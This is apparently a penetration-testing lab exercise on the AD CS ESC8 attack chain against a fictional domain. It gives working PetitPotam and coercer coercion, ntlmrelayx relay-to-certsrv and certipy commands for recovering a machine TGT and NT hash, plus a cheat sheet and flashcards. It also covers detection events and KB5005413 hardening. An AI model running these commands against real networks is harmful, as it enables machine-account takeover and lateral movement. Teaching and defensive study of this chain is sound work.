    Exercise 4.7: ADCS ESC8 (NTLM Relay to Web Enrollment)

    Before You Begin

    ESC8 chains three building blocks: (1) authentication coercion, (2) NTLM relay, (3) AD CS web enrollment with no Extended Protection for Authentication (EPA). PetitPotam (or a similar coercer) forces a target machine to authenticate to an attacker-controlled SMB endpoint; ntlmrelayx.py forwards that authentication to the IIS /certsrv enrollment page; the CA issues a certificate for the relayed machine; the attacker uses the cert to recover the machine's TGT and pivot.

    The PetitPotam-relay-AD-CS chain cost many teams a long weekend in summer 2021. Microsoft's KB5005413 added mitigations (EPA on IIS, signing requirements), but the default install of AD CS Web Enrollment on Windows Server 2016 / 2019 / 2022 still leaves the attack possible unless an administrator explicitly hardens.

    Exercise 4.7 gives you a PetitPotam-coerce-able machine MSSQL01_<TOKEN> and asks you to walk the full chain.

    Tools required: impacket-ntlmrelayx, PetitPotam.py (or coercer), certipy. Pre-installed on Kali.

    Scenario

    Marcus Bell: "ESC8 is the chain that made everyone update their AD CS in 2021. NTLM relay was already a thing. Web enrollment was already a thing. Putting them together was the sentence that cost a lot of teams a long weekend."

    The flag is in MSSQL01_<TOKEN>$'s extensionAttribute3, readable by anyone authenticated as that machine account.

    Credentials:

    Username Password
    j.chen Welcome2026# (some PetitPotam variants need an auth context)

    Domain: corp.nordport.local CA: corp-ca01 (web enrollment at http://corp-ca01/certsrv/) Victim: MSSQL01_<TOKEN>

    Your Objectives

    • Confirm http://corp-ca01/certsrv/ is reachable
    • Start ntlmrelayx.py with --target http://corp-ca01/certsrv/certfnsh.asp --adcs --template Machine
    • Coerce MSSQL01_<TOKEN>$ to authenticate to your Kali via PetitPotam
    • Save the relayed certificate as machine.pfx
    • Use certipy auth to recover the machine's TGT and NT hash
    • Read extensionAttribute3 on MSSQL01_<TOKEN> via LDAP

    Background: Why the Chain Works

    Coercion: MS-EFSRPC

    The MS-EFSRPC protocol exists for legitimate Encrypting File System remote operations. It exposes RPC functions like EfsRpcOpenFileRaw that take a path argument. If you call the function with a path like \\<attacker_ip>\share\file.txt, the target server has to authenticate to <attacker_ip> to access that path. The authentication is performed by the LSA on behalf of the machine account; the credentials sent are the machine's own (Net-NTLM hash of the machine account password).

    PetitPotam (CVE-2021-36942) is the most famous tool for triggering MS-EFSRPC coercion. Variants like PrinterBug, ShadowCoerce, DFSCoerce, and several others use other RPC interfaces with the same overall effect: a target machine is forced to send a Net-NTLM authentication to an attacker-chosen IP.

    Relay: ntlmrelayx with --adcs

    Captured Net-NTLM authentications cannot be cracked back to a machine account password (machine passwords are 240 random bytes; uncrackable). Relay solves the problem by forwarding the authentication to a relay target instead of trying to crack it. The IIS /certsrv endpoint accepts NTLM authentication from any domain machine and lets that machine request a certificate. ntlmrelayx with --adcs --template Machine automates: receive the relayed auth, request a Machine-template cert as the authenticated identity, save the resulting cert.

    The Machine template default

    The Machine template is published on every Enterprise CA by default. It allows Domain Computers to enroll, requires no manager approval, has the Client Authentication EKU, and binds the cert to the machine's identity. The combination of "any domain machine can enroll" + "the cert is for the machine's identity" + "the cert is good for client auth" is exactly what an attacker wants when they can relay machine authentication.

    Why the IIS site is vulnerable

    The /certsrv IIS site historically did not require: - HTTPS (HTTP is enabled by default) - Channel Binding (Extended Protection for Authentication, "EPA") - SMB signing on the relay path (this protects relay TO SMB; HTTP relay has its own EPA story)

    Without HTTPS + EPA, NTLM authentications can be relayed from one channel (SMB inbound from the coerced victim) to another (HTTP outbound to /certsrv) without channel-binding mismatch. KB5005413 documents the hardening: enable HTTPS-only, enable EPA on IIS, configure RPC filters that block the coercion methods. Many environments are still partially mitigated.

    Tool Primer

    ntlmrelayx with AD CS

    ntlmrelayx.py \
  -t http://corp-ca01/certsrv/certfnsh.asp \
  --adcs --template Machine \
  -smb2support
    Flag Effect
    -t relay target URL (the /certsrv enrollment endpoint)
    --adcs request a certificate from the relayed authentication
    --template Machine use the Machine certificate template
    -smb2support accept SMB2 inbound (the coerced auth lands here)

    When a relay succeeds, ntlmrelayx writes the issued certificate to disk (PEM by default; -output-file machine.pfx for PFX format).

    PetitPotam

    PetitPotam.py <kali_ip> mssql01_<TOKEN>.corp.nordport.local

    Optional auth context (some variants need it on patched DCs):

    PetitPotam.py -u j.chen -p 'Welcome2026#' -d corp.nordport.local \
  <kali_ip> mssql01_<TOKEN>.corp.nordport.local

    Output: the target reaches out to <kali_ip> over SMB.

    coercer (multi-method coercion)

    coercer coerce -t mssql01_<TOKEN>.corp.nordport.local \
  -u j.chen -p 'Welcome2026#' -d corp.nordport.local \
  -l <kali_ip>

    Tries every coercion method in sequence. Useful when PetitPotam alone is patched but other variants (ShadowCoerce, DFSCoerce, PrinterBug) still work.

    certipy auth from a machine cert

    certipy auth -pfx machine.pfx -dc-ip <dc_ip>

    Output: machine TGT cached, machine NTLM hash printed.

    Walkthrough

    Step 1: Confirm Targets

    A two-target attack needs two reachability checks. The CA must be alive and accepting NTLM at /certsrv; the victim must be reachable on the RPC endpoint mapper (TCP 135) so PetitPotam can call EFSRPC.

    Kali - Verify CA web enrollment is up

    curl -I http://corp-ca01.corp.nordport.local/certsrv/ -u j.chen:'Welcome2026#'
    Flag Effect
    -I HEAD request only; no body.
    -u user:pass Inline HTTP auth credentials.

    Expect a HTTP/1.1 401 Unauthorized first (NTLM challenge), then HTTP/1.1 200 OK once curl handles the NTLM dance. Confirms /certsrv is reachable and uses NTLM/Negotiate. If you see HTTPS-only, the site is hardened and ESC8 will not work.

    Kali - Verify victim is up

    nc -w 5 mssql01_${OCR_SCOPE_TOKEN}.corp.nordport.local 135 </dev/null

    A clean exit (exit code 0) means TCP 135 is open. The PetitPotam coerce uses an RPC interface served by the endpoint mapper.

    Step 2: Start the Relay Listener

    ntlmrelayx is the listener. It binds SMB (TCP 445) and HTTP (TCP 80) and waits for inbound NTLM authentications. Each captured authentication is forwarded to the configured target. Run it in its own terminal so you can see the relay logs in real time.

    Kali - ntlmrelayx, AD CS mode

    sudo ntlmrelayx.py \
  -t "http://corp-ca01.corp.nordport.local/certsrv/certfnsh.asp" \
  --adcs --template Machine \
  -smb2support \
  -output-file machine
    Flag Effect
    -t <url> Relay target. certfnsh.asp is the IIS endpoint that processes a CSR.
    --adcs After relay succeeds, request a certificate using the relayed identity.
    --template Machine Default-published Machine template; allows Domain Computers to enroll.
    -smb2support Accept SMB2 inbound (most modern Windows speaks SMB2 by default).
    -output-file machine Write the captured cert to machine.pfx (extension auto-applied).

    The listener opens on TCP/445 and TCP/80 by default. Wait for incoming auth.

    Step 3: Trigger the Coercion

    PetitPotam calls the EFSRPC interface on the victim with a UNC path argument pointing at your Kali. The victim's LSA dutifully tries to access that path, and the access requires authentication; the LSA sends the machine account's Net-NTLMv2 over SMB to your Kali. The relay listener catches that auth and forwards it to /certsrv.

    In a second terminal:

    Kali - PetitPotam

    KALI_IP=$(ip -4 -o addr show eth0 | awk '{print $4}' | cut -d/ -f1)
PetitPotam.py "$KALI_IP" "mssql01_${OCR_SCOPE_TOKEN}.corp.nordport.local"
    Token Effect
    ip -4 -o addr show eth0 Print one-line IPv4 addresses for eth0.
    awk '{print $4}' Field 4 is the CIDR-notation address.
    cut -d/ -f1 Strip the /24 suffix; we want just the IP.
    <attacker_ip> First positional: where the victim should authenticate to.
    <victim_fqdn> Second positional: the host to coerce.

    The output ends with Trying to coerce... done! or similar. Switch back to the ntlmrelayx terminal; you should see:

    [*] HTTPS server returned 200; Authenticated
[*] Got certificate for MSSQL01_<TOKEN>$@CORP.NORDPORT.LOCAL
[*] Saved certificate to machine.pfx

    Step 4: Recover the Machine TGT and Hash

    The relayed cert is good for client authentication. PKINIT against the KDC uses the cert as proof-of-identity and returns a TGT for the machine account (and, on un-hardened DCs, the NT hash via PAC_CREDENTIAL_INFO).

    Kali - certipy auth from the relayed cert

    certipy auth -pfx machine.pfx -dc-ip <dc_ip>

    Output reports the machine principal (MSSQL01_<TOKEN>$@CORP.NORDPORT.LOCAL), TGT cached at mssql01_<TOKEN>$.ccache, and the NT hash for the machine account.

    Step 5: Read the Per-Token Flag

    The machine account itself has read access on its own object's attributes. Three equivalent paths to read the flag attribute follow; pick the one that matches what your DC accepts.

    Kali - LDAP query as the machine account

    TOK=$(echo "${OCR_SCOPE_TOKEN}" | tr 'a-z' 'A-Z')
ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "MSSQL01_${TOK}$@corp.nordport.local" \
  -w '<NT hash from certipy>' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(name=MSSQL01_${TOK})" extensionAttribute3

    Some LDAP clients reject NT-hash-as-password for simple binds; alternative is to use the cached TGT:

    export KRB5CCNAME="mssql01_${OCR_SCOPE_TOKEN}\$.ccache"
ldapsearch -Y GSSAPI -LLL -H ldap://corp-dc01 \
  -b "DC=corp,DC=nordport,DC=local" \
  "(name=MSSQL01_${TOK})" extensionAttribute3
    Flag Effect
    -Y GSSAPI Use GSSAPI/Kerberos for the bind (instead of -x simple).
    KRB5CCNAME=<file> Point GSSAPI at the cached TGT.

    Or, simplest, use netexec with the recovered hash:

    netexec ldap corp-dc01 \
  -u "MSSQL01_${TOK}\$" -H '<NT hash>' \
  -d corp.nordport.local \
  --query "(name=MSSQL01_${TOK})" extensionAttribute3

    The attribute value is your flag.

    Common gotchas

    • Listener bind failure: ntlmrelayx fails to bind 445 if your Kali is running Samba. sudo systemctl stop smbd nmbd before launching.
    • Coerce fires but no relay: ntlmrelayx logs "Authentication received" but no cert appears. Common causes: the target /certsrv is HTTPS-only (HTTPS scheme needed); the IIS site has EPA enforced (relay fails channel binding); the Machine template is disabled or not auto-published.
    • MSSQL01 vs mssql01: PetitPotam works either case, but ntlmrelayx logs the case as the LSA sent it. The pfx filename is lowercase; the AD object name is uppercase. Use tr to upper-case when querying AD.
    • PetitPotam patched: try coercer coerce -t <victim> -l <kali_ip> instead; coercer cycles through every known method.
    • NT hash format: certipy prints the hash as <lm>:<nt>. Use only the second segment (the NT half) with netexec's -H.

    Blue Team Perspective

    ESC8 leaves three distinct breadcrumbs across three hosts. Defenders that correlate them catch this attack reliably.

    Activity Event ID Where it fires
    Inbound NTLM auth from machine to attacker IP 4624 logon type 3 (anonymous-ish) DC + victim Security log
    Cert issued to coerced machine 4886, 4887 CA Security log
    PetitPotam-style RPC call RPC filters / EDR Victim host
    PKINIT logon from machine cert 4768 with Certificate Issuer Name DC Security log

    What detects ESC8 fastest

    A SIEM rule that joins on machine identity catches ESC8 without needing rare events: alert when the same machine SAM appears in (a) an unusual outbound NTLM auth and (b) a cert issuance from the CA within 60 seconds. That correlation has near-zero false positives.

    Hardening Note

    KB5005413 published the canonical mitigations. Apply all three layers; defense in depth matters here because each individual mitigation has been bypassed.

    ESC8 hardening

    • Enable HTTPS-only on /certsrv (disable HTTP at the IIS binding level).
    • Enable EPA (Extended Protection for Authentication) on the /certsrv IIS site; channel-binds NTLM to the TLS channel.
    • Apply RPC filters blocking PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce coercion methods.
    • Disable NTLM on internal-facing services that can be moved to Kerberos-only.
    • Enforce SMB signing required so coerced auths are not relayable to SMB targets either.
    • Forward CA event logs (4886/4887) to the SIEM with retention for slow-burn abuse.

    Analysis Questions

    1. KB5005413 documents three layers of mitigation: HTTPS-only, EPA, and RPC filters that block the coercion methods. Which is the strongest, and why is the chain often only partially mitigated in production?

    Reveal Answer

    The strongest single mitigation is EPA (Extended Protection for Authentication) on the IIS /certsrv site combined with HTTPS-only. EPA channel-binds the NTLM authentication to the TLS channel, so an attacker cannot relay a session captured on one transport (SMB inbound) to another transport (HTTP outbound to /certsrv) without breaking the channel binding. With EPA enforced and HTTPS-only, the relay step fails regardless of whether coercion succeeded. RPC filters that block PetitPotam-style coercion are useful but incomplete: every blocked method has a successor (PetitPotam -> ShadowCoerce -> DFSCoerce -> CheeseOunce -> ...). In production the chain is often partially mitigated because: (a) enabling HTTPS on /certsrv requires a cert chain configuration that some teams have not done, (b) EPA breaks some legacy enrollment scripts that did not handle channel binding, (c) RPC filters require regular maintenance as new coercion methods are published. The pragmatic recommendation is the layered approach: do all three.

    2. The relayed machine account has a 240-byte random password. The attack does not crack the password; it captures a usable certificate. What does the cert give you that the password (if you had it) would not?

    Reveal Answer

    The cert and the machine password give you the same authentication capability against AD: both yield a usable Kerberos TGT for the machine account, which can read the machine's own attributes, perform any operation the machine is configured to perform, and (critically) is often a stepping stone to local SYSTEM on the host itself via S4U2self. The advantage of the cert: (a) it persists across machine password rotations; the cert remains valid for its lifetime (typically 1 year for Machine templates) regardless of what happens to the password; (b) you obtain the cert without ever needing to read or compute the password, so the chain works even if the machine's keytab is unrecoverable; (c) some downstream protocols (PKINIT, smartcard logon, certain RDP modes) accept the cert directly without converting back to NTLM. So the cert is strictly more flexible. For long-term persistence on a compromised machine account, an attacker who could recover the password might still go through the cert path explicitly because the cert outlasts the password rotation.

    3. The machine's NTLM hash is printed by certipy auth. With the machine hash, what can the attacker do to the underlying host?

    Reveal Answer

    A lot. The machine hash is the LSA secret for the host's machine account. An attacker with the hash can: (a) compute a Silver Ticket forging a TGS for any service running as the machine account (typically cifs/<host>, host/<host>, RPCSS/<host>); (b) authenticate to the host as the machine itself, which has access to its own LSA secrets and can extract every cached credential; (c) S4U2self via the machine to impersonate any user (computer accounts have implicit T2A4D-like behavior for self-targeted services); (d) decrypt DPAPI-protected secrets stored in the machine context (Windows credentials saved as the SYSTEM account); (e) read the SAM database and recover any local account hashes. From the machine hash, local SYSTEM on the host is one Silver Ticket away, and from there the rest of the local machine state is open. ESC8 plus a juicy victim host is essentially full local compromise of that host plus a foothold for further lateral movement.

    Key Takeaways

    • ESC8 = coerce + relay + AD CS web enrollment + no EPA.
    • ntlmrelayx.py with --adcs --template Machine automates the relay-to-cert step.
    • PetitPotam is the famous coercer; coercer.py tries every variant.
    • The recovered machine cert yields a TGT and (on un-hardened DCs) the machine's NTLM hash.
    • Mitigation: HTTPS + EPA on /certsrv, RPC filters blocking coercion methods, signing requirements.

    Cheat Sheet Recap

    The four operations below run the entire ESC8 chain. Have two terminals open: one for the relay listener, one for the coercer.

    Goal Command
    Start relay listener sudo ntlmrelayx.py -t "http://<ca>/certsrv/certfnsh.asp" --adcs --template Machine -smb2support -output-file machine
    Coerce victim (PetitPotam) PetitPotam.py <kali_ip> <victim_fqdn>
    Coerce victim (multi-method) coercer coerce -t <victim_fqdn> -u <user> -p '<pw>' -d <domain> -l <kali_ip>
    Recover TGT + hash from cert certipy auth -pfx machine.pfx -dc-ip <dc>

    Card 1: ntlmrelayx ADCS Mode

    Q: Write the ntlmrelayx command to relay incoming NTLM auth to corp-ca01's certfnsh.asp endpoint, requesting a Machine-template cert.

    Answer 
    sudo ntlmrelayx.py \
  -t "http://corp-ca01/certsrv/certfnsh.asp" \
  --adcs --template Machine \
  -smb2support

    Add -output-file machine to save the resulting cert as machine.pfx. Default listeners are TCP/80 and TCP/445; the coerced auth typically arrives on 445.

    Card 2: PetitPotam Trigger

    Q: Write the PetitPotam command to coerce mssql01.corp.local to authenticate to your Kali at 10.10.10.99.

    Answer 
    PetitPotam.py 10.10.10.99 mssql01.corp.local

    Add -u user -p pass -d corp.local if the unauthenticated EFSRPC call has been patched and you need an authenticated context. Variants if PetitPotam alone fails: coercer coerce -t mssql01.corp.local -l 10.10.10.99 tries every known coercion method.

    Card 3: Cert-to-Hash via certipy

    Q: One command to recover a TGT and NTLM hash from a captured machine cert machine.pfx.

    Answer 
    certipy auth -pfx machine.pfx -dc-ip 10.10.10.10

    Output: machine principal name, TGT cached at <sam>$.ccache, NTLM hash printed. On May-2022-hardened DCs the hash is no longer included; the TGT is still usable.

    Card 4: KB5005413 Three Mitigations

    Q: List the three KB5005413 mitigations for ESC8.

    Answer
    1. HTTPS-only on /certsrv (disable HTTP, force TLS). 2. EPA (Extended Protection for Authentication) on the IIS site (channel-bind NTLM to the TLS channel). 3. RPC filters that block the coercion methods (PetitPotam EFSRPC, PrinterBug, etc.). The first two prevent the relay step; the third prevents the coercion. Layered defense; do all three.

    Card 5: Why the Cert Outlasts the Password

    Q: A relayed Machine cert is good for 1 year. Why is that more useful than the machine's password (which rotates every 30 days)?

    Answer

    Machine passwords rotate automatically every 30 days by default; an attacker who captured the password loses it at the next rotation. A cert is good for its full validity period (typically 1 year for Machine templates) regardless of password rotation, so the attacker has a stable identity for the machine for the cert's lifetime. The defender's response is to revoke the cert (CRL update) when the compromise is detected, but unless the defender knows the cert exists, it remains a working identity until expiration.
